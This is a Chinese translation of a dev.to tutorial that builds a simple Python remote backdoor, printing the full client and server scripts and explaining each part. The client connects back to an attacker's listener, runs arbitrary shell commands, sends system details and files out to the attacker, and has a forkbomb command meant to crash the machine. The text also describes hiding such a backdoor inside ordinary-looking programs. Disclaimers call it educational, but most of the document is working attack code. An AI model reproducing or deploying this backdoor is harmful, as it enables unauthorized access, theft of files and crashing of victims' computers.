# 用 Python 实现简单的远程后门

> 原文：<https://dev.to/tman540/simple-remote-backdoor-with-python-33a0>

### 注意:在开始阅读本教程之前:不要将此代码用于恶意目的。本教程仅用于教育目的！

## 第一部分:什么是借壳？

据[维基百科](https://en.wikipedia.org/wiki/Backdoor_(computing)):

> 后门是在计算机系统、产品或嵌入式设备(例如家庭路由器)或其实施例中绕过正常认证或加密的一种方法，通常是秘密的

简而言之，后门程序是安装在机器上的一个软件，它允许某人远程访问计算机，通常是在没有适当许可的情况下。例如，黑客可能使用后门程序来维护对受损机器的远程访问。黑客可能会在看似正常的游戏或程序中隐藏后门。一旦目标机器的用户运行程序，隐藏在软件中的后门将允许黑客远程连接到目标机器，通常是通过命令行。通过远程连接，黑客可以执行命令、编辑和读取文件，等等。

## 第 2 部分:如何构建定制后门(客户端)

这个后门程序将由两个简短的脚本组成。我们要构建的第一个脚本是客户端脚本。这是将被上传到受损机器的脚本。

**剧本**

```
import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Forkbomb
        if cmd == "forkbomb":
            while True:
                os.fork()

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()} Computer Name: {platform.node()} Username: {getpass.getuser()} Release Version: {platform.release()} Processor Architecture: {platform.processor()} """
            sock.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close() 
```

Enter fullscreen mode Exit fullscreen mode

#### 解释

```
colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222 
```

Enter fullscreen mode Exit fullscreen mode

前几行用于初始化一些初始值。`colorama.init()`需要调用 colorama(终端中的彩色文本)。`RHOST`和`RPORT`变量用于连接主机。在上传到目标机器之前，需要更改这些变量。

```
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT)) 
```

Enter fullscreen mode Exit fullscreen mode

下面几行是通过 TCP 端口连接到 IPV4 地址的标准步骤。

```
while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8") 
```

Enter fullscreen mode Exit fullscreen mode

接收命令、执行命令和发送数据的全部代码都封装在一个 while 循环中，因此它将永远运行下去。try-except 是这样的，如果任何命令执行不正确，程序将继续运行，而不是中断连接。头变量在绑定命令之前定义前缀。例如:`hacked@linux-machine:/usr/hacked/Desktop$`下一行将头发送给服务器，这样用户就知道他们在什么目录下，以什么用户的身份登录。`STDOUT`和`STDERR`需要设置为`None`，这样如果服务器发送空数据，命令就不会重复执行。最后一行从服务器接收要执行的命令。

**命令:**

<u>列表文件</u>

```
if cmd == "list":
    sock.send(str(os.listdir(".")).encode()) 
```

Enter fullscreen mode Exit fullscreen mode

此命令用于代替 ls，因为有时 ls 不一致

<u>叉弹</u>

```
if cmd == "forkbomb":
    while True:
        os.fork() 
```

Enter fullscreen mode Exit fullscreen mode

当一个进程一次又一次地复制自己，导致所有系统资源被消耗，通常会导致系统崩溃，这就是叉弹攻击。while 循环无限复制 python 进程，导致计算机崩溃。

<u>CD</u>T2】

```
elif cmd.split(" ")[0] == "cd":
    os.chdir(cmd.split(" ")[1])
    sock.send("Changed directory to {}".format(os.getcwd()).encode()) 
```

Enter fullscreen mode Exit fullscreen mode

这个命令比 bash 内置的 cd 更有效。这是因为在 Linux 中更改目录时，python 工作目录不会受到影响。这个命令使用`os.chdir()`来改变 python 和 Linux 中的工作目录。分割命令允许单独处理参数(在本例中，是要更改到的目录)

<u>sysinfo</u>T2】

```
 elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()} Computer Name: {platform.node()} Username: {getpass.getuser()} Release Version: {platform.release()} Processor Architecture: {platform.processor()} """
            sock.send(sysinfo.encode()) 
```

Enter fullscreen mode Exit fullscreen mode

sysinfo 命令结合使用 platform 模块和 getpass 模块来获取有关系统的信息，例如:操作系统、机器的主机名、当前用户、当前操作系统版本和处理器架构。这个文本被很好地格式化并发送给主机服务器。

<u>下载</u>

```
elif cmd.split(" ")[0] == "download":
    with open(cmd.split(" ")[1], "rb") as f:
        file_data = f.read(1024)
        while file_data:
            print("Sending", file_data)
            sock.send(file_data)
            file_data = f.read(1024)
        sleep(2)
        sock.send(b"DONE")
    print("Finished sending data") 
```

Enter fullscreen mode Exit fullscreen mode

下载命令稍微复杂一点。再次，命令被分割以提取参数。这一次，不是一次发送文件中的所有数据，而是必须将文件分割成 1024 字节(1KB ),因为服务器一次只能接收 1KB。文件发送完毕后，客户端向服务器发送“done”(以字节为单位)，让服务器知道文件传输完成。

<u>退出</u>

```
elif cmd == "exit":
    sock.send(b"exit")
    break 
```

Enter fullscreen mode Exit fullscreen mode

当调用 exit 时，文本“exit”(以字节为单位)被发送到服务器。这将通知服务器终止连接。`Break`退出`while True`循环，终止程序。

<u>其他命令</u>

```
else:
    comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()
    if not STDOUT:
        sock.send(STDERR)
    else:
        sock.send(STDOUT) 
```

Enter fullscreen mode Exit fullscreen mode

如果输入的命令不是已知的内部命令，则通过系统执行。`subprocess`模块用于通过系统外壳执行命令。输出返回到两个变量，`STDOUT`和`STDERR`。`STDOUT`是标准系统输出。`STDERR`是标准误差输出。下一个 if 语句检查输出是否到达`STDOUT`或`STDERR`。一旦被检查，它就发送适当的数据。

```
 if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close() 
```

Enter fullscreen mode Exit fullscreen mode

最后，如果没有收到命令，程序可以认为连接中有错误，并将终止循环。因为整个代码都包装在一个 try-except 中，所以程序会将异常发送到服务器。一旦循环终止，套接字将关闭。

## 第三部分:如何构建自定义后门(服务器)

第二个脚本是服务器脚本。该脚本在攻击者的机器上执行。这是客户端将连接到的脚本，也发送一个 shell，攻击者将通过它发送命令。

**剧本**

```
import socket
import colorama

colorama.init()

LHOST = "127.0.0.1"
LPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    if command is b"":
        print("Please enter a command")
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)
client.close()
sock.close() 
```

Enter fullscreen mode Exit fullscreen mode

**解说**

```
colorama.init()

LHOST = "127.0.0.1"
LPORT = 2222 
```

Enter fullscreen mode Exit fullscreen mode

前几行是用于初始化的。`LHOST`是服务器将要托管的 IP 地址。`LPORT`是服务器将被托管的端口。

```
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept() 
```

Enter fullscreen mode Exit fullscreen mode

第 9-13 行用于初始化服务器。同样，`socket.AF_INET`是在 IPV4 地址上启动服务器，`socket.SOCK_STREAM`是在 TCP 端口上运行服务器。`sock.bind((LHOST, LPORT))`在给定的 IP 和端口上启动服务器。`sock.listen(1)`告诉程序只接受一个输入连接。`client`是一个允许程序与连接的客户端交互的对象，例如，发送数据。`addr`是一个元组，包含连接的客户端的 IP 和端口。

```
while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode() 
```

Enter fullscreen mode Exit fullscreen mode

就像客户端一样，整个代码被包装在一个`while True:`循环中，这样命令可以不断地发送和执行，直到循环结束。`input_header`是输入前的文本。例如:`hacked@linux-machine:/usr/hacked/Desktop$`。该数据从客户端接收，并作为参数输入到`input`函数。用户被要求输入一个命令，它被编码成字节并保存到命令变量中。

```
 if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break
        print("Finished reading data") 
```

Enter fullscreen mode Exit fullscreen mode

服务器中只有一个预定义的命令；下载。执行下载时，它会打开一个与要下载的文件同名的新文件。接下来，该函数一次读取 1KB，并将数据写入文件。如果服务器收到数据“完成”(以字节为单位)，则接收数据的循环停止。

```
 if command is b"":
        print("Please enter a command") 
```

Enter fullscreen mode Exit fullscreen mode

如果没有输入命令，则提醒用户必须输入数据。

```
 else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data) 
```

Enter fullscreen mode Exit fullscreen mode

如果其他条件都不满足，脚本会将命令发送到客户端执行。`data`变量接收命令的输出(由客户端发送)。如果收到的数据是“exit ”,服务器将终止连接并中断循环，从而退出脚本。一旦循环中断，到客户机和服务器套接字的连接就会关闭。

## 第四部分:结论

记住，未经允许进入任何电脑都是违法的。制作这个脚本是因为我对这些类型的技术如何工作很感兴趣。不要以任何非法的理由使用这个程序。这个程序也是一个非常简单的后门，并不是 100%稳定或完整的。

### 来源:

封面图片:[每日圆点](https://www.dailydot.com/layer8/what-is-a-backdoor/)

后门定义:[维基百科](https://en.wikipedia.org/wiki/Backdoor_(computing))